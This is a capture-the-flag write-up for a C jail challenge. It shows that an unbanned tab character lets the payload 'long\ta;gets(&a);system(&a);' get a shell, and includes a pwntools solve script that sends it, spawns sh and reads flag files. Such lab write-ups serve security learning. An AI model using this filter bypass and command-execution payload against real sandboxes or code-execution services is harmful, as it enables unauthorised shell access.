# Pixel Perfect - Writeup

**CTF**: Midnight Flag 2026
**Category**: Misc (C Jail)
**Author**: fun88337766
**Flag**: `MCTF{C_1s_V3ry_P0w3rful_4nd_4LL_H15_53Cr3ts_4r3_S4f3_H3r3_1n_th3_M1ghTy_C0d3}`

## TL;DR

C jail with heavily restricted charset. Tab character (`\t`) is not banned and works as whitespace in C. Use `gets()` + `system()` with a stack variable to get shell.

## Analysis

The challenge takes one line of C code, inserts it into `main()`, compiles with `gcc -O3`, and executes. Banned characters:

```
# [ ] < > % $ : _ ' " * = , ? \ / | 0-9 - + (space)
```

Allowed: `a-zA-Z ! & ( ) . ; @ ^ { } ~` and **tab** (`\t`).

Key restrictions:
- No string literals (`"` and `'` banned)
- No numbers (`0-9` banned)
- No assignment (`=` banned)
- No pointer syntax (`*` banned)
- No array indexing (`[]` banned)
- No arithmetic (`+ - * /` banned)
- **No space** (banned) — but **tab is NOT banned**

## Vulnerability

The `banned_char` string does not include `\t` (tab). GCC accepts tab as whitespace, so `long\ta` compiles identically to `long a`.

## Exploit

```
long\ta;gets(&a);system(&a);
```

Where `\t` is a literal tab character (0x09).

This compiles to:
```c
int main()
{
long	a;gets(&a);system(&a);
}
```

1. `long a` — declares 8-byte buffer on stack (tab separates type and name)
2. `gets(&a)` — reads command from stdin into buffer (returns pointer to `a`)
3. `system(&a)` — executes the command stored in `a`

After compilation, send `sh` to get a shell, then `cat /flag*`.

## Solve Script

```python
from pwn import *

r = remote('HOST', PORT, timeout=60)
r.recvuntil(b'> ')
r.sendline(b'long\ta;gets(&a);system(&a);')
r.recvuntil(b'Good luck!', timeout=30)
r.sendline(b'sh')
import time; time.sleep(1)
r.sendline(b'cat /flag*')
time.sleep(1)
r.sendline(b'exit')
print(r.recvrepeat(5).decode())
r.close()
```

## Key Lessons

- Always check the FULL charset of banned characters — whitespace variants (tab, vertical tab, form feed) are often overlooked
- `gets()` is the perfect function for this jail: single argument, reads from stdin, returns pointer
- `&variable` gives a pointer without needing `*` in the type declaration
- GCC `-w` suppresses the `gets()` deprecation warning
